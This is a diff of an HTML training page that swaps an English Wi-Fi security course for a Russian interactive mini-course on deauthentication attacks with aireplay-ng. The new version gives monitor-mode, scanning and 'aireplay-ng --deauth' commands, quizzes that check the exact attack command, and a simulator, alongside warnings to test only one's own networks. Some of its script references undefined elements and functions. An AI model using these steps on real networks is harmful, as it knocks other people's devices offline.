@@ -1,969 +1,619 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Security Education | Wi-Fi Security Analysis</title>
-    <style>
-        :root {
-            --background-dark: #121212;
-            --card-dark: #1e1e1e;
-            --text-primary: #e0e0e0;
-            --text-secondary: #a0a0a0;
-            --accent-steel: #4682b4;
-            --accent-steel-dark: #385e82;
-            --danger: #ff4d4d;
-            --success: #4caf50;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--background-dark);
-            color: var(--text-primary);
-            line-height: 1.6;
-            padding-bottom: 50px;
-        }
-
-        header {
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 1rem;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            backdrop-filter: blur(5px);
-        }
-
-        .container {
-            width: 90%;
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 20px 0;
-        }
-
-        h1, h2, h3 {
-            margin-bottom: 1rem;
-            color: var(--accent-steel);
-        }
-
-        h1 {
-            font-size: 2rem;
-            text-align: center;
-            margin-top: 1rem;
-        }
-
-        h2 {
-            font-size: 1.5rem;
-            border-bottom: 1px solid var(--accent-steel);
-            padding-bottom: 0.5rem;
-            margin-top: 2rem;
-        }
-
-        p {
-            margin-bottom: 1rem;
-        }
-
-        .card {
-            background-color: var(--card-dark);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            border-left: 3px solid var(--accent-steel);
-        }
-
-        .warning {
-            background-color: rgba(255, 77, 77, 0.2);
-            border-left: 3px solid var(--danger);
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-
-        .warning h3 {
-            color: var(--danger);
-        }
-
-        .terminal {
-            background-color: #000;
-            border-radius: 5px;
-            padding: 15px;
-            font-family: 'Courier New', Courier, monospace;
-            margin-bottom: 20px;
-            overflow-x: auto;
-        }
-
-        .command {
-            color: var(--accent-steel);
-            margin-bottom: 5px;
-        }
-
-        .output {
-            color: #8f8f8f;
-            margin-bottom: 10px;
-        }
-
-        .interactive-terminal {
-            background-color: #000;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-
-        .interactive-terminal input {
-            width: 100%;
-            background-color: transparent;
-            border: none;
-            color: var(--accent-steel);
-            font-family: 'Courier New', Courier, monospace;
-            padding: 5px 0;
-            outline: none;
-        }
-
-        .interactive-terminal .prompt::before {
-            content: "$ ";
-            color: var(--accent-steel);
-        }
-
-        button {
-            background-color: var(--accent-steel);
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: background-color 0.3s;
-        }
-
-        button:hover {
-            background-color: var(--accent-steel-dark);
-        }
-
-        .quiz-container {
-            margin-top: 30px;
-        }
-
-        .quiz-question {
-            margin-bottom: 20px;
-        }
-
-        .options {
-            margin-top: 10px;
-        }
-
-        .option {
-            background-color: var(--card-dark);
-            padding: 10px 15px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .option:hover {
-            background-color: #2a2a2a;
-        }
-
-        .option.selected {
-            border-left: 3px solid var(--accent-steel);
-        }
-
-        .option.correct {
-            border-left: 3px solid var(--success);
-        }
-
-        .option.incorrect {
-            border-left: 3px solid var(--danger);
-        }
-
-        .progress-container {
-            width: 100%;
-            background-color: var(--card-dark);
-            border-radius: 5px;
-            margin: 20px 0;
-        }
-
-        .progress-bar {
-            height: 10px;
-            background-color: var(--accent-steel);
-            border-radius: 5px;
-            width: 0%;
-            transition: width 0.5s;
-        }
-
-        .module {
-            margin-bottom: 30px;
-        }
-
-        .module-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-            padding: 10px 15px;
-            background-color: var(--card-dark);
-            border-radius: 5px;
-        }
-
-        .module-content {
-            display: none;
-            padding: 15px;
-            background-color: rgba(30, 30, 30, 0.5);
-            border-radius: 0 0 5px 5px;
-        }
-
-        .module-content.active {
-            display: block;
-        }
-
-        .tab-container {
-            margin: 20px 0;
-        }
-
-        .tabs {
-            display: flex;
-            margin-bottom: 10px;
-            overflow-x: auto;
-            scrollbar-width: none;
-        }
-
-        .tabs::-webkit-scrollbar {
-            display: none;
-        }
-
-        .tab {
-            padding: 10px 15px;
-            background-color: var(--card-dark);
-            cursor: pointer;
-            margin-right: 5px;
-            border-radius: 5px 5px 0 0;
-            white-space: nowrap;
-        }
-
-        .tab.active {
-            background-color: var(--accent-steel);
-        }
-
-        .tab-content {
-            display: none;
-            padding: 15px;
-            background-color: var(--card-dark);
-            border-radius: 0 5px 5px 5px;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .note {
-            background-color: rgba(70, 130, 180, 0.2);
-            border-left: 3px solid var(--accent-steel);
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-
-        .note h3 {
-            color: var(--accent-steel);
-        }
-
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            h2 {
-                font-size: 1.3rem;
-            }
-            
-            .container {
-                width: 95%;
-                padding: 10px 0;
-            }
-            
-            .card {
-                padding: 15px;
-            }
-            
-            button {
-                width: 100%;
-                margin-bottom: 10px;
-            }
-        }
-
-        footer {
-            text-align: center;
-            padding: 20px;
-            margin-top: 30px;
-            background-color: var(--card-dark);
-            color: var(--text-secondary);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Мини-курс: Сбой Wi-Fi с aireplay-ng</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;400&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0; padding: 0; min-height: 100vh;
+      background: #181b1f;
+      color: #fff;
+      font-family: 'Montserrat', 'Oswald', Arial, sans-serif;
+      font-size: 16px;
+      box-sizing: border-box;
+      overflow-x: hidden;
+      max-width: 100vw;
+      position: relative;
+    }
+    body {
+      min-height: 100vh;
+      width: 100vw;
+      position: relative;
+    }
+    /* SVG-анимированный фон */
+    #cyber-bg {
+      position: fixed;
+      left: 0; top: 0; width: 100vw; height: 100vh;
+      z-index: 0;
+      pointer-events: none;
+      opacity: 0.18;
+    }
+    header {
+      background: transparent;
+      padding: 2.2rem 1rem 1.2rem 1rem;
+      text-align: center;
+      z-index: 2;
+      position: relative;
+      animation: fadein 1.2s cubic-bezier(.4,0,.2,1);
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2.1rem;
+      color: #fff;
+      letter-spacing: 0.13em;
+      font-weight: 700;
+      text-transform: uppercase;
+      line-height: 1.1;
+      text-shadow: 0 2px 16px #000a;
+      animation: slidein-top 1.2s cubic-bezier(.4,0,.2,1);
+    }
+    header .subtitle {
+      color: #b0b6be;
+      font-size: 1.05em;
+      margin-top: 0.7em;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      animation: fadein 1.5s cubic-bezier(.4,0,.2,1);
+    }
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1.5rem 0.5rem 2.5rem 0.5rem;
+      max-width: 100vw;
+      margin: 0 auto;
+      width: 100%;
+      box-sizing: border-box;
+      min-width: 0;
+      z-index: 2;
+      position: relative;
+    }
+    .progress {
+      width: 100%;
+      height: 8px;
+      background: #23272b;
+      border-radius: 3px;
+      margin: 1.2rem 0 1.5rem 0;
+      overflow: hidden;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+      border: 1.5px solid #fff2;
+      box-shadow: 0 0 12px #ff2a2a33;
+    }
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #ff2a2a 0%, #fff 100%);
+      width: 0%;
+      transition: width 0.7s cubic-bezier(.4,0,.2,1);
+      box-shadow: 0 0 16px #ff2a2a88;
+      animation: cyber-bar 2.5s infinite linear alternate;
+    }
+    @keyframes cyber-bar {
+      0% { filter: brightness(1.1); }
+      50% { filter: brightness(1.5) drop-shadow(0 0 8px #ff2a2a); }
+      100% { filter: brightness(1.1); }
+    }
+    .card {
+      background: rgba(24,27,31,0.98);
+      border-radius: 18px;
+      box-shadow: 0 2px 24px #000a;
+      padding: 1.2rem 1rem;
+      margin-bottom: 1.2rem;
+      width: 100%;
+      max-width: 700px;
+      transition: box-shadow 0.2s;
+      box-sizing: border-box;
+      min-width: 0;
+      border: 2px solid #fff2;
+      position: relative;
+      overflow: hidden;
+      animation: fadein 1.2s cubic-bezier(.4,0,.2,1);
+    }
+    .card.active {
+      border: 2px solid #ff2a2a;
+      box-shadow: 0 0 0 2px #fff, 0 2px 24px #000a;
+    }
+    .step-title {
+      color: #fff;
+      font-size: 1.25rem;
+      margin-bottom: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.09em;
+      text-transform: uppercase;
+      border-left: 4px solid #ff2a2a;
+      padding-left: 0.7em;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+      animation: slidein-left 1.2s cubic-bezier(.4,0,.2,1);
+    }
+    .terminal, .simulator {
+      background: #181b1f;
+      color: #fff;
+      border-radius: 10px;
+      padding: 0.9rem 1rem;
+      font-size: 1.05em;
+      margin: 0.7rem 0 0.7rem 0;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      box-shadow: 0 1px 8px #0008;
+      position: relative;
+      overflow-x: auto;
+      border: 1.5px solid #fff2;
+    }
+    .terminal .prompt {
+      color: #ff2a2a;
+      font-weight: 700;
+    }
+    .terminal .output {
+      color: #b0b6be;
+      display: block;
+      margin-top: 0.2em;
+    }
+    .test label {
+      color: #fff;
+      font-size: 1em;
+      font-weight: 700;
+      margin-bottom: 0.5em;
+      letter-spacing: 0.04em;
+    }
+    .test input[type="text"] {
+      width: 100%;
+      padding: 0.6em;
+      border-radius: 8px;
+      border: 1.5px solid #ff2a2a;
+      background: #181b1f;
+      color: #fff;
+      font-family: inherit;
+      font-size: 1.05em;
+      margin-bottom: 0.7em;
+      box-sizing: border-box;
+    }
+    .test button {
+      background: #ff2a2a;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 0.6em 1.3em;
+      font-size: 1.05em;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 0.2em;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      box-shadow: 0 1px 8px #0008;
+    }
+    .test button:active {
+      background: #fff;
+      color: #ff2a2a;
+    }
+    .test .result {
+      margin-top: 0.5em;
+      font-size: 1em;
+      font-weight: 700;
+    }
+    .mini-pc { display: flex; justify-content: center; margin: 1.2em 0; width: 100%; max-width: 100vw; overflow-x: hidden; box-sizing: border-box; min-width: 0; }
+    .pc-body { background: rgba(24,27,31,0.98); border-radius: 18px; box-shadow: 0 4px 32px #000a; padding: 1.2em 1em 1em 1em; width: 98vw; max-width: 400px; min-width: 0; position: relative; border: 2px solid #fff2; margin: 0 auto; overflow: hidden; box-sizing: border-box; }
+    .pc-screen { background: #111216; border-radius: 12px; box-shadow: 0 2px 12px #0008, 0 0 0 2px #fff2 inset; width: 100%; min-height: 100px; height: 32vw; max-height: 180px; margin-bottom: 1em; display: flex; align-items: flex-end; overflow: hidden; position: relative; min-width: 0; max-width: 100%; box-sizing: border-box; border: 2px solid #fff2; }
+    .pc-terminal { color: #fff; font-family: 'JetBrains Mono', 'Consolas', monospace; font-size: 1.13em; padding: 0.9em; width: 100%; min-height: 2em; filter: contrast(1.1) brightness(1.1); text-shadow: 0 0 2px #fff2, 0 0 1px #ff2a2a22; animation: term-flicker 2.5s infinite linear alternate; word-break: break-all; }
+    @keyframes term-flicker { 0%{opacity:1;} 97%{opacity:1;} 98%{opacity:0.97;} 99%{opacity:1;} 100%{opacity:0.99;} }
+    .pc-leds { display: flex; gap: 0.7em; margin-bottom: 1em; justify-content: center; }
+    .led { display: inline-block; width: 18px; height: 18px; border-radius: 50%; background: #444; box-shadow: 0 0 8px #0008; border: 2px solid #fff2; opacity: 0.4; filter: brightness(0.7); transition: opacity 0.4s, filter 0.4s, box-shadow 0.4s; }
+    .led.on { opacity: 1; filter: brightness(1.2); }
+    .led-green { background: #fff; box-shadow: 0 0 12px #fff; }
+    .led-yellow { background: #ffeb3b; box-shadow: 0 0 12px #ffeb3b; }
+    .led-red { background: #ff2a2a; box-shadow: 0 0 12px #ff2a2a; }
+    .pc-keyboard { margin-top: 0.7em; }
+    .pc-input { width: 100%; background: #181b1f; color: #fff; border: 1.5px solid #ff2a2a; border-radius: 8px; padding: 0.9em 0.7em; font-size: 1.13em; font-family: inherit; margin-bottom: 0.7em; box-sizing: border-box; }
+    .pc-reload { display: block; margin: 0.7em auto 0 auto; background: #181b1f; color: #fff; border: 1.5px solid #fff2; border-radius: 10px; padding: 0.7em 1.5em; font-size: 1.13em; font-family: inherit; cursor: pointer; box-shadow: 0 1px 4px #0006; transition: background 0.15s, color 0.15s; font-weight: 700; letter-spacing: 0.04em; }
+    .pc-reload:active { background: #ff2a2a; color: #fff; }
+    .sim-progress { width: 100%; background: #23272b; border-radius: 6px; margin: 1em 0 0.5em 0; height: 14px; overflow: hidden; }
+    .sim-progress-bar { height: 100%; background: #ff2a2a; width: 0%; transition: width 0.5s; }
+    .next-btn {
+      background: #ff2a2a;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 0.7em 1.5em;
+      font-size: 1.1em;
+      font-family: inherit;
+      cursor: pointer;
+      margin: 1.2em auto 0 auto;
+      display: block;
+      transition: background 0.2s;
+      box-shadow: 0 1px 6px #0006;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+    }
+    .next-btn:active {
+      background: #fff;
+      color: #ff2a2a;
+    }
+    @media (min-width: 900px) {
+      main { max-width: 700px; }
+      .card, .mini-pc, .pc-body { max-width: 700px; margin: 0 auto; }
+      .pc-body { padding: 2.2em 2em 2em 2em; }
+      .pc-screen { max-height: 220px; }
+    }
+    @media (max-width: 600px) {
+      header h1 { font-size: 1.2rem; }
+      .card { padding: 0.7rem 0.3rem; }
+      .step-title { padding: 0.2rem 0.1rem; font-size: 1.05rem; }
+      .pc-body { max-width: 98vw; width: 98vw; padding: 0.2em 0.01em 0.2em 0.01em; }
+      .mini-pc { max-width: 100vw; padding: 0; }
+      .pc-terminal, .pc-input { font-size: 16px; }
+      .pc-screen { height: 32vw; min-height: 100px; max-height: 140px; }
+    }
+    @keyframes fadein {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slidein-top {
+      from { opacity: 0; transform: translateY(-40px); }
+      to { opacity: 1; transform: none; }
+    }
+    @keyframes slidein-left {
+      from { opacity: 0; transform: translateX(-40px); }
+      to { opacity: 1; transform: none; }
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <h1>Network Security Education</h1>
+  <svg id="cyber-bg" width="100%" height="100%" viewBox="0 0 1920 1080" preserveAspectRatio="none">
+    <g id="cyber-lines">
+      <polyline points="100,100 400,200 700,100" stroke="#ff2a2a" stroke-width="2" fill="none">
+        <animate attributeName="points" values="100,100 400,200 700,100; 120,120 420,220 720,120; 100,100 400,200 700,100" dur="6s" repeatCount="indefinite"/>
+      </polyline>
+      <polyline points="300,800 800,900 1200,700" stroke="#fff" stroke-width="1.2" fill="none">
+        <animate attributeName="points" values="300,800 800,900 1200,700; 320,820 820,920 1220,720; 300,800 800,900 1200,700" dur="7s" repeatCount="indefinite"/>
+      </polyline>
+      <circle cx="1600" cy="200" r="8" fill="#ff2a2a">
+        <animate attributeName="cy" values="200;250;200" dur="3s" repeatCount="indefinite"/>
+      </circle>
+      <circle cx="200" cy="900" r="5" fill="#fff">
+        <animate attributeName="cy" values="900;950;900" dur="4s" repeatCount="indefinite"/>
+      </circle>
+    </g>
+  </svg>
+  <header>
+    <h1>Мини-курс: Сбой Wi-Fi с помощью aireplay-ng</h1>
+    <div class="subtitle">Тёмная тема • Мобильная адаптация • Стальной акцент</div>
+  </header>
+  <main>
+    <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
+    <div id="steps"></div>
+    <button class="next-btn" id="next-btn" style="display:none;">Далее</button>
+  </main>
+  <script>
+    // Этапы курса
+    const steps = [
+      {
+        title: 'Введение',
+        content: `<p><b>Deauth-атака</b> — это способ временно отключить устройства от Wi-Fi сети, отправляя специальные пакеты (deauthentication) на точку доступа. Это используется для тестирования безопасности, но <b>запрещено применять на чужих сетях</b>!<br><br>
+        <b>aireplay-ng</b> — часть пакета aircrack-ng, позволяет отправлять такие пакеты. В этом курсе вы узнаете, как это работает, и попробуете симуляцию на мини-компьютере.<br><br>
+        <span style='color:var(--danger)'>Всё, что вы увидите — только для обучения и тестирования своих сетей!</span></p>`
+      },
+      {
+        title: 'Как работает deauth-атака?',
+        content: `<p>Wi-Fi работает по стандарту IEEE 802.11. Любое устройство может отправить deauth-пакет, чтобы отключить клиента от точки доступа.<br>
+        <b>aireplay-ng</b> позволяет отправлять такие пакеты массово, вызывая сбой соединения у всех клиентов.<br><br>
+        <b>Пример сценария:</b><br>
+        1. Перевести адаптер в режим мониторинга<br>
+        2. Найти нужную сеть (BSSID)<br>
+        3. Отправить deauth-пакеты<br>
+        4. Клиенты теряют соединение и пытаются переподключиться</p>`
+      },
+      {
+        title: 'Шаг 1: Подготовка',
+        content: `<p>Для начала убедитесь, что у вас есть Wi-Fi адаптер с поддержкой режима мониторинга и установлен пакет <b>aircrack-ng</b>.<br>В реальной жизни для тестирования используйте только свои сети!</p>
+        <div class="terminal"><span class="prompt">$</span> sudo apt update && sudo apt install aircrack-ng</div>`
+      },
+      {
+        title: 'Шаг 2: Перевод адаптера в режим мониторинга',
+        content: `<p>Переведите Wi-Fi адаптер в режим мониторинга (пример для интерфейса <b>wlan0</b>):</p>
+        <div class="terminal"><span class="prompt">$</span> sudo airmon-ng start wlan0</div>`
+      },
+      {
+        title: 'Шаг 3: Поиск сетей',
+        content: `<p>Сканируем эфир для поиска доступных Wi-Fi сетей:</p>
+        <div class="terminal"><span class="prompt">$</span> sudo airodump-ng wlan0mon</div>`
+      },
+      {
+        title: 'Шаг 4: Деаутентификация клиентов',
+        content: `<p>Для сбоя работы сети отправим deauth-пакеты:<br>Замените <b>[BSSID]</b> на MAC-адрес точки доступа, <b>[iface]</b> — на ваш интерфейс (например, wlan0mon):</p>
+        <div class="terminal"><span class="prompt">$</span> sudo aireplay-ng --deauth 10 -a [BSSID] [iface]</div>`
+      },
+      {
+        title: 'Тест: Команда для режима мониторинга',
+        content: `<div class="test">
+          <label>Введите команду для перевода адаптера wlan0 в режим мониторинга:</label>
+          <input type="text" id="test1" autocomplete="off" placeholder="...">
+          <button onclick="checkTest1()">Проверить</button>
+          <div class="result" id="result1"></div>
+        </div>`
+      },
+      {
+        title: 'Тест: Команда деаутентификации',
+        content: `<div class="test">
+          <label>Введите команду для отправки 10 deauth-пакетов (BSSID: 11:22:33:44:55:66, iface: wlan0mon):</label>
+          <input type="text" id="test2" autocomplete="off" placeholder="...">
+          <button onclick="checkTest2()">Проверить</button>
+          <div class="result" id="result2"></div>
+        </div>`
+      },
+      {
+        title: 'Симулятор атаки',
+        content: `<div class="mini-pc">
+          <div class="pc-body">
+            <div class="pc-screen" id="pc-screen">
+              <div class="pc-terminal" id="pc-terminal">
+                <span class="pc-prompt">user@pentest:~$</span> <span id="pc-cmd"></span><span class="pc-cursor" id="pc-cursor">█</span>
+              </div>
+            </div>
+            <div class="pc-leds">
+              <span class="led led-green" id="led-power"></span>
+              <span class="led led-yellow" id="led-net"></span>
+              <span class="led led-red" id="led-attack"></span>
+            </div>
+            <div class="pc-keyboard">
+              <input class="pc-input" id="pc-input" autocomplete="off" placeholder="Введите команду и Enter">
+            </div>
+          </div>
         </div>
-    </header>
+        <div class="sim-output" id="sim-output"></div>
+        <div class="sim-progress" id="sim-progress" style="display:none;"><div class="sim-progress-bar" id="sim-progress-bar"></div></div>
+        <div style="text-align:center;margin-top:1em;color:var(--accent2);font-size:0.98em;">Попробуйте пройти все этапы атаки на мини-компьютере!</div>`
+      },
+      {
+        title: 'Поздравляем!',
+        content: `<p>Вы прошли мини-курс и попробовали симуляцию сбоя Wi-Fi с помощью aireplay-ng.<br>Используйте эти знания только в легальных целях и для тестирования своих сетей!</p>`
+      }
+    ];
 
-    <div class="container">
-        <div class="warning">
-            <h3>Educational Purposes Only</h3>
-            <p>This content is provided strictly for educational purposes to understand network vulnerabilities and improve security. Always practice security techniques only on networks you own or have explicit permission to test. Unauthorized network testing is illegal and unethical.</p>
-        </div>
+    let currentStep = 0;
+    const stepsDiv = document.getElementById('steps');
+    const nextBtn = document.getElementById('next-btn');
+    const progressBar = document.getElementById('progress-bar');
 
-        <div class="card">
-            <h2>Introduction to Wi-Fi Security Analysis</h2>
-            <p>Welcome to this educational course on Wi-Fi security analysis. Understanding how networks can be vulnerable helps security professionals better protect them. This course will teach you about legitimate security testing tools and techniques in a responsible manner.</p>
-            
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-        </div>
+    function renderStep() {
+      stepsDiv.innerHTML = '';
+      const step = steps[currentStep];
+      const card = document.createElement('div');
+      card.className = 'card active';
+      card.innerHTML = `<div class="step-title">${step.title}</div>${step.content}`;
+      stepsDiv.appendChild(card);
+      // Кнопка далее
+      if (currentStep < steps.length - 1) {
+        nextBtn.style.display = 'block';
+        nextBtn.disabled = (step.title.startsWith('Тест') || step.title.startsWith('Симулятор'));
+      } else {
+        nextBtn.style.display = 'none';
+      }
+      // Прогресс
+      progressBar.style.width = ((currentStep) / (steps.length - 1) * 100) + '%';
+      // Вызов setupMiniPC при рендере этапа симулятора
+      if (step.title === 'Симулятор атаки') {
+        setTimeout(setupMiniPC, 100);
+      }
+    }
 
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module1')">
-                <h2>Module 1: Understanding Wi-Fi Security Basics</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module1">
-                <p>Before diving into security analysis, it's essential to understand the fundamentals of Wi-Fi networks and their security mechanisms.</p>
-                
-                <div class="tab-container">
-                    <div class="tabs">
-                        <div class="tab active" onclick="switchTab('tab1', 'content1')">Wi-Fi Protocols</div>
-                        <div class="tab" onclick="switchTab('tab2', 'content2')">Security Types</div>
-                        <div class="tab" onclick="switchTab('tab3', 'content3')">Common Vulnerabilities</div>
-                    </div>
-                    
-                    <div class="tab-content active" id="content1">
-                        <h3>Wi-Fi Protocols</h3>
-                        <p>Wi-Fi networks operate on IEEE 802.11 standards, which have evolved over time:</p>
-                        <ul>
-                            <li>802.11a/b/g - Early standards with limited security</li>
-                            <li>802.11n - Improved speeds and some security enhancements</li>
-                            <li>802.11ac/ax - Modern standards with better security features</li>
-                        </ul>
-                    </div>
-                    
-                    <div class="tab-content" id="content2">
-                        <h3>Security Types</h3>
-                        <p>Wi-Fi networks use various security protocols:</p>
-                        <ul>
-                            <li>WEP - Outdated and highly vulnerable</li>
-                            <li>WPA - Improved but still has vulnerabilities</li>
-                            <li>WPA2 - Current standard with AES encryption</li>
-                            <li>WPA3 - Latest standard with enhanced security</li>
-                        </ul>
-                    </div>
-                    
-                    <div class="tab-content" id="content3">
-                        <h3>Common Vulnerabilities</h3>
-                        <p>Wi-Fi networks can be vulnerable to various issues:</p>
-                        <ul>
-                            <li>Weak encryption (particularly in WEP and early WPA)</li>
-                            <li>Default or weak passwords</li>
-                            <li>Unpatched firmware vulnerabilities</li>
-                            <li>Deauthentication attacks (which we'll study safely)</li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Quick Check</h3>
-                    <div class="quiz-question">
-                        <p>Which Wi-Fi security protocol is considered the most outdated and vulnerable?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, true)">WEP</div>
-                            <div class="option" onclick="selectOption(this, false)">WPA2</div>
-                            <div class="option" onclick="selectOption(this, false)">WPA3</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(1)">Complete Module</button>
-            </div>
-        </div>
+    nextBtn.onclick = function() {
+      if (currentStep < steps.length - 1) {
+        currentStep++;
+        renderStep();
+      }
+    };
 
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module2')">
-                <h2>Module 2: Introduction to Security Tools</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module2">
-                <p>In this module, we'll learn about legitimate security testing tools used by network administrators and security professionals.</p>
-                
-                <div class="card">
-                    <h3>Security Testing Environment</h3>
-                    <p>For ethical security testing, professionals typically use:</p>
-                    <ul>
-                        <li>Dedicated testing networks that they own</li>
-                        <li>Virtual lab environments</li>
-                        <li>Networks they have explicit permission to test</li>
-                    </ul>
-                </div>
-                
-                <div class="note">
-                    <h3>Important Note</h3>
-                    <p>The tools discussed in this course should only be used in legal, authorized contexts such as:</p>
-                    <ul>
-                        <li>Testing your own network's security</li>
-                        <li>Professional penetration testing with proper authorization</li>
-                        <li>Educational labs with isolated networks</li>
-                    </ul>
-                </div>
-                
-                <h3>Common Network Security Tools</h3>
-                <p>Security professionals use various tools for network analysis:</p>
-                
-                <div class="card">
-                    <h3>Aircrack-ng Suite</h3>
-                    <p>A complete suite for Wi-Fi network security assessment that includes:</p>
-                    <ul>
-                        <li><strong>airmon-ng</strong> - Sets up monitoring mode on wireless interfaces</li>
-                        <li><strong>airodump-ng</strong> - Packet capture tool for wireless networks</li>
-                        <li><strong>aireplay-ng</strong> - Tool for generating network traffic for analysis</li>
-                    </ul>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Quick Check</h3>
-                    <div class="quiz-question">
-                        <p>When is it appropriate to use network security testing tools?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, false)">On any network to practice skills</div>
-                            <div class="option" onclick="selectOption(this, true)">Only on networks you own or have permission to test</div>
-                            <div class="option" onclick="selectOption(this, false)">On public Wi-Fi to test their security</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <button onclick="completeModule(2)">Complete Module</button>
-            </div>
-        </div>
+    // Тест 1: команда для режима мониторинга
+    window.checkTest1 = function() {
+      const val = document.getElementById('test1').value.trim();
+      const res = document.getElementById('result1');
+      if (/^sudo\s+airmon-ng\s+start\s+wlan0$/i.test(val)) {
+        res.innerHTML = '<span style="color:var(--success)">Верно!</span>';
+        nextBtn.disabled = false;
+      } else {
+        res.innerHTML = '<span style="color:var(--danger)">Неверно. Попробуйте ещё раз.</span>';
+      }
+    };
+    // Тест 2: команда деаутентификации
+    window.checkTest2 = function() {
+      const val = document.getElementById('test2').value.trim();
+      const res = document.getElementById('result2');
+      if (/^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(val)) {
+        res.innerHTML = '<span style="color:var(--success)">Верно!</span>';
+        nextBtn.disabled = false;
+      } else {
+        res.innerHTML = '<span style="color:var(--danger)">Неверно. Попробуйте ещё раз.</span>';
+      }
+    };
+    // Симулятор атаки
+    window.runSim = function() {
+      const val = document.getElementById('sim-cmd').value.trim();
+      const out = document.getElementById('sim-output');
+      if (/^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(val)) {
+        out.innerHTML = 'Отправка deauth-пакетов...<br>Клиенты отключены! <span style="color:var(--success)">[Успех]</span>';
+        nextBtn.disabled = false;
+      } else if (val) {
+        out.innerHTML = '<span style="color:var(--danger)">Ошибка: неправильная команда.</span>';
+      } else {
+        out.innerHTML = '';
+      }
+    };
 
-        <div class="module">
-            <div class="module-header" onclick="toggleModule('module3')">
-                <h2>Module 3: Understanding Network Monitoring</h2>
-                <span class="toggle-icon">+</span>
-            </div>
-            <div class="module-content" id="module3">
-                <p>Network monitoring is a crucial skill for security professionals. Let's learn how to properly monitor network activity in a controlled environment.</p>
-                
-                <h3>Setting Up a Network Interface in Monitor Mode</h3>
-                <p>The first step in network analysis is setting up your wireless interface to monitor network traffic:</p>
-                
-                <div class="terminal">
-                    <div class="command">sudo airmon-ng check kill</div>
-                    <div class="output">Killing these processes:
-PID Name
-1234 NetworkManager</div>
-                    <div class="command">sudo airmon-ng start wlan0</div>
-                    <div class="output">PHY     Interface     Driver     Chipset
-phy0    wlan0mon     ath9k      Qualcomm Atheros</div>
-                </div>
-                
-                <div class="note">
-                    <h3>Explanation</h3>
-                    <p>These commands:</p>
-                    <ul>
-                        <li>Kill processes that might interfere with monitor mode</li>
-                        <li>Enable monitor mode on the wireless interface (wlan0)</li>
-                        <li>The interface is renamed to wlan0mon when in monitor mode</li>
-                    </ul>
-                </div>
-                
-                <h3>Interactive Practice</h3>
-                <p>Try entering the commands to set up monitor mode:</p>
-                
-                <div class="interactive-terminal">
-                    <div class="prompt">
-                        <input type="text" id="monitorCommand" placeholder="Enter the command to start monitor mode on wlan0">
-                    </div>
-                    <button onclick="checkCommand('monitorCommand', 'sudo airmon-ng start wlan0', 'Correct! Monitor mode enabled on wlan0.', 'Try again. The command should start with sudo airmon-ng start')">Submit</button>
-                    <div id="monitorCommandResult"></div>
-                </div>
-                
-                <div class="quiz-container">
-                    <h3>Quick Check</h3>
-                    <div class="quiz-question">
-                        <p>Why do we need to run airmon-ng check kill before enabling monitor mode?</p>
-                        <div class="options">
-                            <div class="option" onclick="selectOption(this, true)">To kill processes that might interfere with monitor mode</div>
-                            <div class="option" onclick="selectOption(this, false)">To save battery power</div>
